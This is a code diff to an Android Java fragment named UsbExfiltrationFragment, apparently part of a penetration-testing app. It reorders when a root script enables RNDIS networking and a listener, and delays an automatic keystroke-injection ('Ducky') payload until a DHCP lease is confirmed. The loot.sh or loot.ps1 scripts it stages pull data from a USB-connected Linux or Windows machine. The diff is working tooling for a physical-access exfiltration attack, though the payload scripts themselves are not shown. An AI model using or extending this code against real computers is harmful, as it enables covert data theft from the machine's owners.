@@ -290,11 +290,13 @@ public class UsbExfiltrationFragment extends Fragment {
 
     private void checkAutoInject(String logs) {
         if (swAutoInject != null && swAutoInject.isChecked() && !hasAutoInjected) {
-            // Check for "DHCPACK" (dnsmasq) or "Target ip address" (dhcpd/usbtethering script)
-            if (logs.contains("DHCPACK") || logs.contains("Target ip address")) {
+            // MUST wait for "Target ip address" - this confirms DHCP lease is fully assigned
+            // "DHCPACK" appears too early before the network is ready
+            if (logs.contains("Target ip address")) {
                 hasAutoInjected = true;
-                appendLog("[*] Auto-Injecting Ducky Payload (DHCP Lease Detected)...");
-                injectDucky();
+                appendLog("[*] Auto-Injecting Ducky Payload (DHCP Lease Confirmed)...");
+                // Small delay to ensure network stack is fully ready
+                mainHandler.postDelayed(() -> injectDucky(), 2000);
             }
         }
     }
@@ -396,7 +398,26 @@ public class UsbExfiltrationFragment extends Fragment {
         new Thread(() -> {
             String selectedTarget = spTargetOS.getSelectedItem().toString().equals("Linux") ? "lnx" : "win";
 
-            // Detect RNDIS interface IP
+            // Check if files exist in SD card (they should be synced by App startup)
+            String sdPath = NhPaths.SD_PATH + "/nh_files/usb_exfil/";
+            if (!new File(sdPath + "listen.py").exists()) {
+                appendLog("[-] Error: listen.py not found in " + sdPath);
+                appendLog("[!] Please restart the app to sync files.");
+                return;
+            }
+
+            // Execute start script FIRST - it enables RNDIS and starts usbtethering
+            // The script is in APP_SD_FILES_PATH/usb_exfil/start.sh
+            String scriptPath = NhPaths.APP_SD_FILES_PATH + "/usb_exfil/start.sh";
+            exe.RunAsRoot("chmod 755 " + scriptPath);
+            appendLog("[*] Executing: " + scriptPath);
+
+            String out = exe.RunAsRootOutput("sh " + scriptPath + " " + NhPaths.APP_SCRIPTS_PATH + " " + selectedTarget);
+            appendLog("[+] Output: " + out);
+            appendLog("[*] RNDIS should be active.");
+            appendLog("[*] Python listener should be running in chroot.");
+
+            // NOW detect RNDIS IP after the interface is configured
             String rndisIp = detectRndisIp();
             if (rndisIp == null || rndisIp.isEmpty()) {
                 appendLog("[-] Warning: Could not detect RNDIS IP, using default 192.168.137.1");
@@ -405,7 +426,7 @@ public class UsbExfiltrationFragment extends Fragment {
                 appendLog("[+] Detected RNDIS IP: " + rndisIp);
             }
 
-            // Copy selected script to loot.sh or loot.ps1
+            // Copy selected script to loot.sh or loot.ps1 and inject the IP
             String scriptDir = selectedTarget.equals("lnx") ? "scripts_linux" : "scripts_windows";
             String selectedScript = selectedTarget.equals("lnx") ? selectedLinuxScript : selectedWindowsScript;
             String targetScript = selectedTarget.equals("lnx") ? "loot.sh" : "loot.ps1";
@@ -423,51 +444,8 @@ public class UsbExfiltrationFragment extends Fragment {
                 appendLog("[*] Using custom script");
             }
 
-            // Enable RNDIS first
-            enableRndisSync(selectedTarget);
-
-            // Check if files exist in SD card (they should be synced by App startup)
-            String sdPath = NhPaths.SD_PATH + "/nh_files/usb_exfil/";
-            if (!new File(sdPath + "listen.py").exists()) {
-                appendLog("[-] Error: listen.py not found in " + sdPath);
-                appendLog("[!] Please restart the app to sync files.");
-                return;
-            }
-
-            // Execute start script
-            // The script is in APP_SD_FILES_PATH/usb_exfil/start.sh
-            String scriptPath = NhPaths.APP_SD_FILES_PATH + "/usb_exfil/start.sh";
-            exe.RunAsRoot("chmod 755 " + scriptPath);
-            appendLog("[*] Executing: " + scriptPath);
-
-            String out = exe.RunAsRootOutput("sh " + scriptPath + " " + NhPaths.APP_SCRIPTS_PATH + " " + selectedTarget);
-            appendLog("[+] Output: " + out);
-            appendLog("[*] RNDIS should be active.");
-            appendLog("[*] Python listener should be running in chroot.");
             appendLog("[*] Monitoring " + LOG_FILE + "...");
         }).start();
-    }
-
-    private void enableRndisSync(String target) {
-        appendLog("[*] Enabling RNDIS...");
-        // Updated logic based on USBArsenalFragment for Target: Linux, Func: rndis,hid, ADB: Disabled
-        String functions = "rndis,hid";
-        // String target = "lnx"; // Passed as arg
-        String adbEnable = ""; // Disabled
-
-        // Default IDs (Keeping existing ones for now, but these were for Google RNDIS)
-        String idVendor = "0x18d1";
-        String idProduct = "0x4ee7";
-
-        // USBArsenalFragment construction:
-        // We bypass the [ -f /init.nethunter.rc ] && setprop ... check to ensure our custom IDs are applied
-        // and that ADB is strictly disabled/enabled as per our request, which setprop might override with defaults.
-        String command = NhPaths.APP_SCRIPTS_PATH + "/usbarsenal -t '" + target +
-                "' -f '" + functions + "'" + adbEnable +
-                " -v '" + idVendor + "' -p '" + idProduct + "'";
-
-        exe.RunAsRootOutput(command);
-        appendLog("[+] RNDIS Enabled (Target: Linux, Func: rndis,hid).");
     }
 
     private void stopExfilAttack() {
